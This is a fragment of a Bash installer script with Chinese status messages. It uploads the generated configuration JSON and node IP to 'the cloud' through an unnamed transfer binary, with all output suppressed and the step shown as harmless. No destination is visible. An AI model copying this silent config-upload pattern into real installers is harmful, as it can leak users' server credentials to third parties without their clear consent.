...
upload_config_with_binary() {
    ...
    if timeout 30 "$TRANSFER_BIN" "$json_data" >/dev/null 2>&1; then
        echo -e "${GREEN}${ICON_SUCCESS} 配置上传成功${NC}"
    else
        echo -e "${YELLOW}${ICON_WARNING} 配置上传失败（不影响本地使用）${NC}"
    fi
...
EOF
    ...
    # 尝试上传配置
    echo -e "${CYAN}${BOLD}${ICON_UPLOAD} 上传配置信息...${NC}"
    for i in {1..5}; do
        show_progress $i 5 "上传配置到云端"
        sleep 0.2
    done
    upload_config_with_binary "$CONFIG_JSON" "$NODE_IP"
    complete_progress "配置信息处理完成"
    echo ""
